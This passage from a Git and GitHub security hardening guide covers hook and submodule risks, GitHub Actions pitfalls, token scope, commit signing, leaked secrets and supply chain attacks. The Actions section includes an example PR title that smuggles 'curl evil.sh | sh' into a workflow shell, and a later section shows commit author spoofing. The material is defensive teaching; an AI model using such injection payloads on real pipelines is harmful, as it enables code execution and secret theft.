  echo "possible credential in staged changes — commit blocked" >&2
  exit 1
fi
```

> **THREAT — hooks as a code-execution primitive.** Client-side hooks are why `git clone` of an
> untrusted repository has repeatedly been an RCE vector. Hooks aren't cloned, so attackers look for
> ways to write into `.git/` anyway:
> - **CVE-2024-32002** — crafted submodules on case-insensitive filesystems could write into
>   `.git/hooks/`, giving RCE on `git clone --recursive`.
> - **CVE-2021-21300** — clean/smudge filter abuse for the same end.
> - **CVE-2018-11235** — arbitrary code execution via crafted `.gitmodules`.
>
> **Defences:** keep Git patched (this class recurs); don't `--recursive` clone untrusted repos;
> clone suspicious repos in a container/VM; set `core.symlinks=false`, `core.protectNTFS=true`,
> `core.protectHFS=true`. Note `core.fsmonitor` and `diff.external` in a repo-local config are also
> execution vectors — which is why Git added `safe.directory` and refuses to read config from repos
> owned by other users.

---

## 12. Submodules, Subtrees, LFS and Worktrees

### Submodules

A submodule pins another repository at an exact commit. The parent stores `.gitmodules` (URL) plus a
special **gitlink** tree entry holding the child's commit hash.

```bash
git submodule add https://github.com/acme/lib vendor/lib
git clone --recurse-submodules <url>
git submodule update --init --recursive
git submodule update --remote      # move the pin to child's latest — a real change, review it
git -c protocol.file.allow=never submodule update   # block file:// submodule URLs
```

> **THREAT — submodules are a supply chain edge**
> - **The URL is attacker-influenced data.** A PR editing `.gitmodules` to point elsewhere redirects
>   your build's dependency — one changed line, easy to wave through.
> - **Pin drift.** `--remote` silently advances the pin; a compromised upstream is inherited.
> - **Parser history.** CVE-2018-11235, CVE-2019-1387, CVE-2024-32002 — recursive clone of untrusted
>   content is genuinely dangerous.
> - **Deleted upstream.** If the repo or commit disappears, your build breaks — or someone
>   re-registers the namespace and serves different content.
>
> **Controls:** require review on `.gitmodules` via CODEOWNERS; mirror third-party deps into your own
> org; pin to full commit hashes; disable `protocol.file`.

### Subtrees — the alternative

```bash
git subtree add  --prefix=vendor/lib https://github.com/acme/lib main --squash
git subtree pull --prefix=vendor/lib https://github.com/acme/lib main --squash
```

A subtree copies the dependency's files in. Clones are simple, no extra commands, and **the code is
visible to your scanners and reviewers**. Cost: bigger repo, awkward upstream contribution. For
security-sensitive dependencies the visibility is often worth it.

### Git LFS

```bash
git lfs install
git lfs track "*.psd" "*.bin"   # writes rules into .gitattributes
git lfs ls-files
```

LFS replaces large files with pointer files, storing content on a separate server. Two consequences:
**LFS content lives outside the Git object model** (not covered by commit hashes the way blobs are),
and **your secret scanning may not see it** unless LFS-aware. Confirm before assuming coverage.

### Worktrees

```bash
git worktree add ../hotfix release/2.4   # second working tree, same object store
git worktree list
git worktree remove ../hotfix
```

The correct answer to "I need to fix production but I'm mid-refactor" — far safer than stashing under
pressure.

---

## 13. GitHub: Forks and Pull Requests

```
     UNTRUSTED SIDE          │  TRUST BOUNDARY (PR)  │      TRUSTED SIDE
                             │                        │
 ┌──────────────────┐        │  ┌──────────────────┐  │  ┌────────────────────┐
 │contributor laptop│        │  │  PULL REQUEST    │  │  │   upstream/api     │
 └────────┬─────────┘        │  ├──────────────────┤  │  │ protected: main    │
          │ git push         │  │ diff vs base     │  │  │ nothing writes     │
 ┌────────▼─────────┐  opens │  │ required reviews │  │  │ here directly      │
 │   their fork     │───PR──►│  │ required checks  │──┼─►└─────────┬──────────┘
 │ alice/api        │        │  │ CODEOWNERS       │  │            │
 │ NO RULES APPLY   │        │  │ secret/SAST/deps │  │  ┌─────────▼──────────┐
 └──────────────────┘        │  │ signature verify │  │  │ release / deploy   │
          ▲                  │  └──────────────────┘  │  │ environments       │
          └────────── git fetch upstream ─────────────┘  └────────────────────┘

⚠️ EVERY CONTROL ABOVE IS BOUND TO THE PR PATH. Write deploy keys, admin bypass, apps with
   contents:write, and branches excluded from rulesets all reach main WITHOUT passing the gate.
```

A fork is a full copy under someone else's control — which is exactly why the model works:
**untrusted contributors never need write access to your repository.**

| Concept | Meaning |
|---|---|
| Fork | Server-side copy in your namespace. **Forks of a public repo share an object store with the upstream network** (see §18) |
| Pull request | Request to merge head ref into base ref + review state + checks. Exposed as `refs/pull/<n>/head` and computed `refs/pull/<n>/merge` |
| Merge commit | Preserves all commits, adds a merge node |
| Squash and merge | One commit on base, authored by contributor, **committed by GitHub**. Discards individual signatures |
| Rebase and merge | Replays each commit. New hashes, signatures stripped, linear |
| Merge queue | Serialises merges and re-runs checks against the **actual resulting tree** |

> **PITFALL — squash and rebase merges destroy signatures.** If your policy is "all commits on main
> must be signed by their author", note these create new commit objects signed by *GitHub's* key. The
> branch shows **Verified** but the attestation is now "GitHub performed this merge", not "the author
> wrote this code".

### Reviewing a PR properly

- **Read the diff against the merge base, then check the merge result.** For anything sensitive,
  fetch the branch and run `git diff main...pr-branch` yourself.
- **Look at what is not code.** Workflow files, `.gitignore`, `.gitattributes`, `.gitmodules`,
  lockfiles, Dockerfiles, anything under `.github/` — these change *what runs*, not what the app does.
- **Check the commit list, not just the aggregate diff.** A commit can add and later remove a secret;
  the aggregate diff shows nothing while the object remains forever.
- **Watch for force-pushes after approval.** Configure "dismiss stale approvals on push".
- **Be suspicious of large mechanical diffs.** Reformatting, generated files and vendored deps are
  where hostile changes hide.

> **THREAT — Trojan Source and invisible characters.** Unicode bidirectional control characters make
> source *render* differently from how a compiler *parses* it — a reviewer sees a comment, the
> compiler sees code. Homoglyphs substitute visually identical characters (`сheck_auth` with Cyrillic
> с is a different identifier). Zero-width characters hide payload boundaries.
> **Defences:** GitHub warns on bidi Unicode in diffs, but don't rely on the UI. Add a CI check
> rejecting U+202A–U+202E, U+2066–U+2069, U+200B–U+200D and non-ASCII identifiers outside expected
> files.

---

## 14. GitHub Actions

Actions turns your repository into a compute platform holding production credentials. It is the
highest-value target in most GitHub estates, and the defaults are convenient rather than safe.

| Concept | Meaning |
|---|---|
| Event | push, pull_request, schedule, workflow_dispatch, issue_comment, release |
| Workflow | YAML in `.github/workflows/`. **Which copy runs depends on the event** — the security-critical detail |
| Job | Runs on one runner; parallel unless chained with `needs:` |
| Step | A `run:` command or a `uses:` action reference |
| Runner | GitHub-hosted (ephemeral, clean VM per job) or self-hosted (yours, **not ephemeral by default**) |
| `GITHUB_TOKEN` | Short-lived installation token minted per job, scoped by `permissions:` |
| Secrets | Encrypted values injected as env vars. **Masked in logs on a best-effort basis only** |
| OIDC | Signed identity token exchanged with a cloud provider for short-lived credentials |

### The single most important distinction

```
A · on: pull_request                                    ✅ SAFE DEFAULT
   fork PR ──> runner (workflow AND code from PR head)
                  └─> GITHUB_TOKEN: read-only
                  └─> secrets: NOT available
                        └─> CONTAINED. Worst case: wasted CI minutes.

B · on: pull_request_target  +  checkout of the PR head   ❌ "PWN REQUEST"
   fork PR ──> runner (workflow from BASE, but CODE FROM HEAD
                       because of  ref: github.event.pull_request.head.sha)
                  └─> GITHUB_TOKEN: read-WRITE
                  └─> secrets: ALL available
                        └─> COMPROMISE. Exfiltrate every secret, push to main,
                            publish a backdoored release.
```

**Why `pull_request_target` exists:** it runs the *workflow definition* from the base branch, so a
fork cannot edit the workflow itself. Genuinely useful for labelling PRs, posting comments, checking
a CLA — tasks needing write access that must never touch contributor code.

**The vulnerability is not the trigger. It is combining the trigger with a checkout of the PR head.**

> "Executes repo content" is broader than it looks: `npm install` runs lifecycle scripts, `make` runs
> a Makefile, a linter loads a config that can specify a plugin. **Any step reading
> attacker-controlled files can become a step running attacker code.**

### Script injection

GitHub interpolates `${{ }}` into the shell script *before* the shell runs, so a value containing
shell metacharacters becomes shell code.

```yaml
# ❌ VULNERABLE — PR title pasted straight into the script
- name: Greet
  run: echo "Reviewing: ${{ github.event.pull_request.title }}"

# a PR titled:   a"; curl evil.sh | sh; echo "
# becomes:       echo "Reviewing: a"; curl evil.sh | sh; echo ""

# ✅ SAFE — pass through the environment; the shell never parses it as code
- name: Greet
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Reviewing: $TITLE"
```

**Never interpolate into `run:`** — `github.event.issue.title`, `issue.body`,
`pull_request.title`, `pull_request.body`, `pull_request.head.ref`, `pull_request.head.label`,
`comment.body`, `review.body`, `review_comment.body`, `commits.*.message`, `commits.*.author.email`,
`commits.*.author.name`, `head_commit.message`, `discussion.title`, `discussion.body`, and any
`workflow_dispatch` input. Route all of them through `env:`.

### A hardened workflow

```yaml
name: ci
on:
  pull_request:                    # NOT pull_request_target unless truly needed

permissions:                       # deny by default at the top level
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15            # bound the blast radius
    steps:
      # pin third-party actions to a full commit SHA, NEVER a tag
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
        with:
          persist-credentials: false   # do not leave the token in .git/config
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
        with: { node-version: 20 }
      - run: npm ci --ignore-scripts   # block dependency lifecycle scripts
      - run: npm test

  deploy:
    needs: build
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    environment: production          # required reviewers + wait timer live here
    permissions:
      id-token: write                # OIDC — no long-lived cloud keys anywhere
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::111122223333:role/gha-deploy
          aws-region: ap-south-1
```

> **THREAT — the mutable tag problem, demonstrated in the wild.** `uses: some/action@v3` resolves a
> **mutable Git tag**. Whoever controls that repository can repoint the tag at any commit, and your
> next run executes different code with your secrets.
> **March 2025: `tj-actions/changed-files`** was compromised exactly this way — existing version tags
> were repointed to a malicious commit that dumped runner memory, and thousands of repositories
> printed their own secrets into public build logs.
> **Controls:** pin every third-party action to a full 40-char SHA with the version in a trailing
> comment; let Dependabot bump the SHAs; restrict which actions can run via org policy; for critical
> pipelines, fork the action into your own org.

> **THREAT — self-hosted runners.** GitHub-hosted runners are destroyed after every job. Self-hosted
> runners by default are not. A malicious job can persist a backdoor for the *next* job, harvest
> credentials left by other pipelines, read the Docker socket, and pivot into the network. **On a
> public repository, attaching a self-hosted runner to a fork-reachable workflow is effectively
> offering RCE inside your network.**
> **Controls:** never on public repos; use `--ephemeral` runners or Actions Runner Controller;
> isolated network segment with egress filtering; scope to specific repos; no broad instance profile.

### Other Actions risks

| Risk | Mechanism |
|---|---|
| Cache poisoning | Caches are branch-scoped; a PR branch can write a cache the base branch later restores |
| Artifact poisoning | A `workflow_run` workflow downloading and executing an untrusted PR's artifact runs attacker code with base privileges |
| Log exfiltration | Secret masking is string matching — base64/reverse/split a secret and it prints in cleartext |
| Reusable workflows | Inherit the caller's permissions and can receive `secrets: inherit` |
| Dangerous default | Older orgs still default workflow permissions to *read and write* |
| Fork approval | Require approval for all outside contributors before their workflows run |

---

## 15. Authentication, Tokens and Blast Radius

| Credential | Reaches | Lifetime | Verdict |
|---|---|---|---|
| Password | — | — | **Removed.** GitHub disabled password auth for Git in Aug 2021 |
| **PAT classic** `ghp_…` | **Every repo in every org the user can access**, coarse scopes like `repo` | Often "never" | ❌ **Avoid.** One leaked token = the user's entire GitHub reach |
| **PAT fine-grained** `github_pat_…` | Selected repos in one org, per-resource permissions | Mandatory, max 1yr | ⚠️ Acceptable. Requires org approval flow |
| **SSH key** | All repos the user can access, **Git operations only** (no API) | Until revoked | ⚠️ Good for humans. Use `ed25519-sk` + passphrase |
| **Deploy key** | Exactly one repo. Read-only unless you grant write | Until revoked | ✅ Best narrow machine read. **Write deploy keys bypass branch protection** |
| **GitHub App** | Only installed repos, only declared permissions. Acts as itself | **1 hour**, auto-refreshed | ✅ **Best for automation** |
| **OIDC federation** | Whatever the cloud role trusts, gated on repo/branch/environment claims | Minutes | ✅ **Best for cloud. No stored credential exists to steal** |
| **`GITHUB_TOKEN`** | Current repo only, scoped by `permissions:` | The job | ✅ Prefer over a PAT in workflows |

> **THE MIGRATION THAT MATTERS MOST.** Classic PATs with `repo` scope and no expiry are the most
> common high-severity finding in a GitHub configuration review. Replace in this order: workflow
> usage → `GITHUB_TOKEN`; cloud deployment → OIDC; bots/integrations → GitHub Apps; remainder →
> fine-grained tokens with the shortest workable expiry. Then **disable classic PAT creation at the
> org level**.

### OIDC, concretely

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/api:environment:production"
    }
  }
}
```

> **PITFALL — the OIDC subject wildcard.** Binding to `repo:org/name:*` means **any branch or PR in
> that repository can assume the production role**. Bind to `:environment:production` (protected with
> required reviewers) or `:ref:refs/heads/main`. Also verify the `aud` claim. Trusting the issuer
> without constraining the subject turns OIDC from the strongest option into a repo-wide privilege
> escalation.

### Account-level controls

- **Require MFA org-wide** — passkeys or hardware keys. TOTP acceptable; SMS is not.
- **SAML SSO + SCIM** so IdP deprovisioning actually removes GitHub access. SSO alone leaves orphans.
- **Authorise PATs and SSH keys for SSO** explicitly — the control that stops pre-existing personal
  tokens working after SSO is enabled.
- **Review third-party OAuth apps and GitHub Apps quarterly.** An app approved in 2019 may still hold
  `repo` scope across the org.
- **Restrict repository creation and membership visibility.**

---

## 16. Branch Protection, Rulesets and CODEOWNERS

Rulesets superseded classic branch protection: repository or org level, target refs by pattern, can
run in **evaluate** mode before enforcement, and are **additive** — several can apply and the
strictest wins.

| Rule | Stops | Default branch |
|---|---|---|
| Require a PR before merging | Direct pushes to `main` | ✅ always |
| Required approvals | Self-merged changes | ✅ ≥1, ideally 2 |
| Dismiss stale approvals on push | Approve-then-rewrite | ✅ always |
| Require Code Owner review | Sensitive paths changed without the right eyes | ✅ always |
| Require approval of the most recent push | Author approving their own last change | ✅ always |
| Require status checks (strict) | Merging red builds and failed scans | ✅ always |
| Require conversation resolution | Unaddressed objections | recommended |
| Require signed commits | Unattributable commits on `main` | ✅ once tooling is ready |
| Require linear history | Unreviewed merge-commit content | depends on merge strategy |
| Block force pushes | History rewriting, evidence destruction | ✅ always |
| Restrict deletions | Branch deletion as cover-up | ✅ always |
| Restrict who can push | Everyone else | for release branches |
| **Include administrators** | **The most common real bypass** | ✅ **yes — this is the point** |

> **THREAT — enumerate the bypasses; they *are* the finding.** A ruleset with a long bypass list
> provides the appearance of control and none of the substance. List every actor reaching the
> protected branch without passing the gate:
> - **Bypass list** on the ruleset (esp. *Repository admin* / *Organization admin*)
> - **Write-enabled deploy keys** — not subject to branch protection at all
> - **GitHub Apps with `contents: write`** installed on the repo
> - **Workflows using a PAT instead of `GITHUB_TOKEN`**, inheriting a human's permissions
> - **Branches not matched by the ruleset pattern** that are nevertheless deployed from
> - **Forks and mirrors** pulled from by a build system
>
> Query it rather than reading the UI:
> `GET /repos/{owner}/{repo}/rules/branches/{branch}` returns the rules actually in effect.

### CODEOWNERS

```
# .github/CODEOWNERS — LAST matching pattern wins (unlike .gitignore)
*                           @acme/engineering
/src/auth/                  @acme/security @acme/identity
/infra/                     @acme/platform
/.github/workflows/         @acme/security    # workflows change what RUNS — always gate
/.github/CODEOWNERS         @acme/security    # stop a PR rewriting its own reviewers
.gitmodules                 @acme/security
**/Dockerfile               @acme/platform @acme/security
*.tf                        @acme/platform
package-lock.json           @acme/security
```

> **PITFALL — CODEOWNERS is inert without the rule.** The file alone only *suggests* reviewers. It
> becomes a control when the ruleset enables **Require review from Code Owners**. A syntax error, or
> a team without write access, causes the entry to be **silently ignored**. Always assign ownership
> of `CODEOWNERS` itself, or a contributor can remove their own reviewer requirement in the same PR.

### Repository hygiene

- Secret scanning **with push protection** (blocks the push, not just alerts)
- Dependabot alerts + security updates + dependency review on PRs
- CodeQL/SAST as a required check
- Default workflow permissions **read-only** at the org level
- Disallow forking of private and internal repositories
- Auto-delete head branches
- `SECURITY.md` + private vulnerability reporting
- **Archive, don't delete** dead repos — preserves history and audit trail

---

## 17. Commit Signing and Provenance

### The problem, demonstrated

```bash
git config user.name  "Linus Torvalds"
git config user.email "torvalds@linux-foundation.org"
git commit -m "totally legitimate change"

git log -1 --format='%an <%ae>'
# Linus Torvalds <torvalds@linux-foundation.org>
```

There is no vulnerability here — Git was designed for a mailing-list workflow where trust came from
the maintainer reading the patch. But it means **the author field is unverified user input**, and any
control reading it (an audit report, a compliance metric, an alerting rule) is reading
attacker-controlled data unless signatures are enforced.

### What "Verified" actually asserts — three cases

| Case | Object | Badge | Asserts |
|---|---|---|---|
| **1 · Unsigned** | `author Linus Torvalds` — free text typed by anyone | ❌ Unverified | **Nothing.** The chain is intact so the commit is unaltered since creation — but *who* made it is unknown |
| **2 · Signed by the developer** | `gpgsig …` covering every header, the tree and the message | ✅ Verified | **The holder of Jane's private key produced this exact content.** Not proof Jane is trustworthy, nor that her key wasn't stolen. Proof of *origin*, not intent |
| **3 · Made in the GitHub web UI** (also squash/rebase merges) | `gpgsig …` **GitHub's own key**, `web-flow`/`noreply@github.com` | ✅ Verified | **GitHub performed this edit for a logged-in session.** If that session was hijacked, the commit is still "Verified". Trust has moved to GitHub's IdP |

**Cases 2 and 3 carry the identical green badge and very different assurances.** When you write a
control saying "all commits on main must be verified", decide which you mean. If you mean case 2,
check the *signing key's identity* — `git log --show-signature` shows the key; the web UI shows a
colour.

### Setting up signing

```bash
# --- SSH signing (simplest, recommended) ---
git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
git config --global tag.gpgSign true

# to verify locally you also need an allowed-signers file
echo "jane@corp.example $(cat ~/.ssh/id_ed25519.pub)" >> ~/.git-allowed-signers
git config --global gpg.ssh.allowedSignersFile ~/.git-allowed-signers
# then add the SAME key to GitHub as a SIGNING key —
# the authentication key entry does NOT grant signature verification

# --- GPG signing ---
gpg --full-generate-key                       # ed25519 or 4096-bit RSA
gpg --list-secret-keys --keyid-format=long
git config --global user.signingkey <KEYID>
gpg --armor --export <KEYID>                  # paste into GitHub → SSH and GPG keys

# --- verifying ---
git log --show-signature -3
git verify-commit HEAD
git verify-tag v2.1.0
git merge --verify-signatures feature/otp
git config --global merge.verifySignatures true

# --- hardware-backed, strongest practical option ---
ssh-keygen -t ed25519-sk -C "jane@corp yubikey"   # private key never leaves the token
```

> **VIGILANT MODE.** Enable *Flag unsigned commits as unverified* in account settings. Without it, an
> unsigned commit shows no badge, which readers interpret as normal. With it, unsigned commits
> attributed to you are explicitly marked **Unverified**, so impersonation is visible rather than
> merely unremarkable.

### Signed tags and release provenance

```bash
git tag -s v2.1.0 -m "release 2.1.0"   # annotated AND signed
git tag -v v2.1.0
git push origin v2.1.0
```

Signed tags are the classic provenance anchor: the tag object commits to a commit hash, which commits
to the entire tree. **One signature covers everything.**

| Mechanism | What it does |
|---|---|
| **Sigstore / gitsign** | Keyless signing: authenticate with OIDC, get an ephemeral cert, sign; cert logged in the public **Rekor** transparency log. No long-lived key management |
| **SLSA** | Graded build-integrity framework. L1 = provenance exists; L3 = hardened, non-falsifiable build service. A maturity ladder, not a checkbox |
| **Artifact attestations** | `actions/attest-build-provenance` produces a signed statement binding an artifact digest to the workflow, commit and runner. Verify with `gh attestation verify` |
| **SBOM** | SPDX/CycloneDX inventory. Only useful if generated *during* the build and stored with the artifact |
| `--verify-signatures` | The enforcement counterpart. **A signature nobody verifies is decoration** |

---

## 18. Secrets in History

The most common serious Git security incident by a wide margin — and the standard remediation
instinct is the wrong one.

**Deleting a file in a new commit does not remove it from history.** The blob still exists, still has
a hash, and is still reachable through every commit that contained it.

```bash
git log --all --diff-filter=D --name-only -- .env
git log -S "AKIA" --all --oneline        # when did this string appear and vanish
git show <old-commit>:.env               # and here it is, in full

# enumerate every blob ever, largest first
git rev-list --objects --all |
  git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' |
  awk '$1=="blob"' | sort -k3 -nr | head -40
```

### Lifecycle of a leaked secret

```
t=0    git push  →  .env with a live AWS key is now public
         │
t+min    ├─> every clone      ├─> CI caches + logs     ├─> scrapers, bots
         ├─> every fork       ├─> mirrors, backups     └─> code search indexes
         └────────────────────────────────────────────────> EXPLOITED
                                     (public-repo keys are abused within minutes)

THE INSTINCTIVE RESPONSE — and what it does NOT achieve:
  git rm .env && git commit      → removes it from the working tree.
                                   The blob is untouched. ZERO EFFECT.
  git filter-repo + force push   → rewrites YOUR ref graph only.
                                   Necessary, but NOT SUFFICIENT.

STILL REACHABLE AFTERWARDS:
  forks · the fork-network object store · existing clones · caches · anyone's copy

⚠️ CROSS-FORK OBJECT REFERENCE — the part that surprises people
   On GitHub, a repository and ALL of its forks share ONE object store. A commit you
   removed from your repository remains fetchable by its hash through ANY fork in the
   network, and through the API, indefinitely. Deleting a fork does not help — the
   object lives in the network, not the fork. Only GitHub Support can purge it.

THE RESPONSE THAT ACTUALLY ENDS THE EXPOSURE:
  1. ROTATE   invalidate the credential before anything else
  2. HUNT     check logs for use of it during the exposure window
  3. PURGE    rewrite history; contact support to drop cached refs
  4. PREVENT  push protection, pre-commit hooks, secret manager
```

> **THE SINGLE MOST IMPORTANT SENTENCE IN THIS DOCUMENT:** a leaked secret is compromised the moment
> it is pushed, and **rotation is the only control that ends the exposure.** History rewriting is
> cleanup, not remediation. Teams that rewrite first and rotate later (or never) are the ones
> breached with a key they believed they had removed.

### Detection

| Tool | Notes |
|---|---|
| **GitHub secret scanning** | Free on public repos; Advanced Security on private. Scans full history, notifies the issuing provider (which often auto-revokes) |
| **Push protection** | Blocks the push containing a recognised pattern. **The only detection that prevents rather than reports** |
| **gitleaks** | `gitleaks detect --source . --log-opts="--all"`. Fast, good defaults, easy in CI and pre-commit |
| **trufflehog** | `trufflehog git file://. --only-verified`. **Verifies** credentials against the provider — cuts false positives enormously |
| **git-secrets** | AWS-focused, hook-oriented, useful lightweight local guard |
| Manual sweep | `git log -S` and `git rev-list --objects --all` for anything without a pattern (internal hostnames, private URLs) |

### Purging — after you have rotated

```bash
# git-filter-repo is the supported tool. git filter-branch is deprecated,
# dangerously slow, and gets edge cases wrong.
pip install git-filter-repo

git clone --mirror git@github.com:acme/api.git && cd api.git
git filter-repo --path .env --invert-paths        # drop a path from all history
git filter-repo --replace-text expressions.txt    # or redact strings in place
#   expressions.txt:   AKIAIOSFODNN7EXAMPLE==>REDACTED

git push --force --mirror     # coordinate: every clone must be RE-CLONED, not pulled

# then — routinely skipped:
#  · ask GitHub Support to GC the fork network and purge cached views
#  · tell every contributor to delete and re-clone
#  · invalidate CI caches that may hold the old objects
#  · re-run the scan to confirm
git count-objects -v
```

> **PITFALL — rewriting breaks everything downstream.** Every commit hash from the rewrite point
> forward changes. Open PRs break, signed commits lose verification, issue/ticket references dangle,
> deployment records naming a commit hash become invalid, and any clone that *pulls* instead of
> re-cloning reintroduces the old history. Plan a rewrite as a coordinated change with a
> communication step.

### Prevention that works

- **Push protection on, org-wide**, with bypass requiring a written reason
- **Pre-commit hooks via `core.hooksPath`** so they are shared and versioned
- **A real secret manager**: Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault
- **OIDC for cloud access** — the highest-value credentials never exist as strings
- **`.env.example` with placeholders** committed; `.env` ignored from day one
- **Short-lived everything.** A one-hour credential is a far smaller incident than one with no expiry
- **Scan the whole history when onboarding a repo**, not just new commits — the problem is usually already there

---

## 19. Supply Chain Attacks

### Attack surface across the delivery path

```
 developer ─> local repo ─> transport ─> [PLATFORM] ─> [CI/CD] ─> registry ─> production

ATTACKS
 stolen SSH key   hook injection    git:// downgrade  account takeover  pwn request      typosquatting    unreviewed
 malicious IDE    CVE-2024-32002    sslVerify=false   malicious PR      script injection dependency       artifact
   extension      malicious repo    MITM on first     merge-commit      unpinned action    confusion      deployed
 infostealer      config on clone     SSH connection    smuggling       tag repoint      maintainer       repo/runtime
   reads .git-    symlink escape    malicious proxy   Trojan Source     self-hosted        takeover         drift
   credentials    .gitattributes    DNS hijack of     repojacking         runner pivot    install scripts  no provenance
 session cookie     filter abuse      internal host   rogue OAuth app   cache poisoning  unsigned images    check at
   theft          exposed .git dir                    insider push      secret in logs   tag mutation       admission

CONTROLS
 hardware keys    patch Git         HTTPS/SSH only    MFA / passkeys    never PR_target  lockfiles +      admission
 EDR + disk       fsckObjects       pinned known_     SSO + SCIM          + head checkout  integrity        controller
   encryption     safe.directory      hosts           rulesets, no      env: not ${{ }}    hashes         signature +
 keychain helper  protectNTFS       StrictHostKey      admin bypass     SHA-pin actions  private registry   provenance
 no plaintext     clone untrusted     Checking        CODEOWNERS        least-priv token scoped names     deploy by
   credentials      repos in a VM   protocol.allow    signed commits    ephemeral runners --ignore-scripts   DIGEST
 phishing         block .git on web never TLS opt-out unicode checks    OIDC, no secrets cosign + SBOM    drift detection
```

**Read it as a chain: the attacker needs one stage, you need every stage.** Note how much of the left
half is **workstation hygiene** — an attacker with a developer's laptop needs none of the cleverness
on the right. Note also that the two highest-value stages (platform, CI) are exactly the two where
the default configuration is weakest.

### The named techniques

**Repojacking.** When a GitHub user/org is renamed or deleted, the old `owner/repo` path can become
claimable. Anything still referencing it — a Go module, submodule, install script, Dockerfile, Action
— silently starts pulling attacker content. GitHub retires popular names; the long tail of internal
references is where this lands.
*Control:* pin to commit hashes, vendor/mirror critical deps, audit for references that now redirect.

**Dependency confusion.** A build configured with both a private and a public registry may resolve an
internal package name to a public package of the same name with a higher version.
*Control:* scoped/namespaced package names routed exclusively to the private registry; never let a
public registry be a fallback for internal names.

**Maintainer compromise and slow social engineering — the `xz-utils` backdoor (2024).** An attacker
spent ~two years building a contribution history, used sockpuppet accounts to pressure the original
maintainer into handing over release authority, then shipped a backdoor **in the release tarball
rather than in the Git repository** — so the malicious content was never in the commit history anyone
reviewed.

> **The lesson people take from xz vs the one they should.** Common takeaway: "review dependencies
> more carefully". More useful takeaway: **the release artifact and the source repository were
> different, and nothing checked that they matched.** Reproducible builds and build-from-source
> provenance detect this class. Code review does not, because the malicious code was never in the code.

**Malicious commits through review.** Hostile changes look boring: a plausible bug fix introducing an
off-by-one in a bounds check, a lockfile-only dependency addition, a test edited to stop asserting, a
refactor quietly removing a check. The 2021 University of Minnesota "hypocrite commits" episode
demonstrated the class against the Linux kernel and got the university banned from contributing.

**Dangling and hidden commits.** A commit pushed then removed from all branches remains fetchable by
hash. Attackers stage payloads that are invisible in the UI but retrievable by a build fetching a
specific SHA.
*Detection:* `git fsck --unreachable --dangling` locally; on GitHub, watch the Events API for pushes
whose commits are on no branch.

### Reference incidents

| Incident | Year | What was attacked |
|---|---|---|
| **xz / liblzma** | 2024 | Release tarball differed from the reviewed repository |
| **tj-actions/changed-files** | 2025 | Version tags repointed; secrets dumped to public logs |
| **Codecov** | 2021 | Modified bash uploader exfiltrated CI environment variables |
| **SolarWinds** | 2020 | Build system compromised; source repository clean |

**Three of those four attacked the *build*, not the source.** That is the strategic point: your code
review process can be perfect and still ship a backdoor, if what you ship is not provably the thing
you reviewed.

---

## 20. Hardening Checklists

### Developer workstation
- [ ] **Keep Git current** — object-parsing and clone-time RCE bugs recur
- [ ] Full-disk encryption + screen lock (a clone is your entire source history on a laptop)
- [ ] **Hardware-backed SSH keys** — `ssh-keygen -t ed25519-sk`, with a passphrase
- [ ] **No plaintext credential storage** — `osxkeychain`/`manager`/`libsecret`; never `store`, never credentials in a remote URL
- [ ] Signing on by default — `commit.gpgsign true`, `tag.gpgSign true`
- [ ] `protocol.allow never` + explicit `https`/`ssh` allows; **never `http.sslVerify false`**
- [ ] `transfer.fsckObjects`, `fetch.fsckObjects`, `receive.fsckObjects` all true
- [ ] Pre-commit secret scanning shared via `core.hooksPath`
- [ ] Global gitignore for `.env`, `*.pem`, `*.key`, `id_rsa`, `.aws/`, `*.kubeconfig`, IDE/OS files
- [ ] **Untrusted repositories cloned in a container**, especially with `--recurse-submodules`
- [ ] Review IDE/editor extensions — they run with your privileges across every repo

### Repository
- [ ] Ruleset on the default branch: PR required, approvals required, stale approvals dismissed, force-push and deletion blocked, **administrators included**
- [ ] Required status checks (build, tests, SAST, dependency review, secret scan) in **strict** mode
- [ ] CODEOWNERS covering `.github/workflows/`, `CODEOWNERS` itself, `.gitmodules`, Dockerfiles, IaC, lockfiles
- [ ] Secret scanning **with push protection**
- [ ] Dependabot alerts + security updates, with someone triaging
- [ ] Signed commits required
- [ ] Default workflow permissions read-only
- [ ] Forking of private repositories disabled
- [ ] `SECURITY.md` + private vulnerability reporting
- [ ] **Deploy keys audited** — read-only unless there is a written reason
- [ ] Archive, don't delete

### Organisation
- [ ] MFA required for all members (passkeys / hardware keys preferred)
- [ ] SAML SSO **with SCIM**
- [ ] **Classic PAT creation disabled**
- [ ] Third-party application access restricted to an approval list, reviewed quarterly
- [ ] Base permissions **none or read**; grant through teams
- [ ] Actions policy: allow only GitHub-authored + explicitly listed actions
- [ ] **Self-hosted runners never on public repositories**; ephemeral, network-isolated, repo-scoped
- [ ] Organisation-level rulesets so new repos are protected on day one
- [ ] **Audit log streaming to your SIEM**
- [ ] Quarterly access review: members, outside collaborators, teams, apps, deploy keys, tokens
- [ ] Offboarding runbook that revokes tokens, SSH keys and app authorisations — not just the account

### CI/CD
- [ ] **Every third-party action pinned to a full commit SHA** with version in a trailing comment
- [ ] **No `pull_request_target` + checkout of the PR head**
- [ ] All untrusted context values routed through `env:`, never interpolated into `run:`
- [ ] Least-privilege `permissions:` at the top of every workflow, starting at `contents: read`
- [ ] **OIDC instead of stored cloud credentials**, subject claim bound to a branch or environment
- [ ] `persist-credentials: false` on checkout unless the job must push
- [ ] Dependency install without lifecycle scripts (`npm ci --ignore-scripts`)
- [ ] `timeout-minutes` on every job
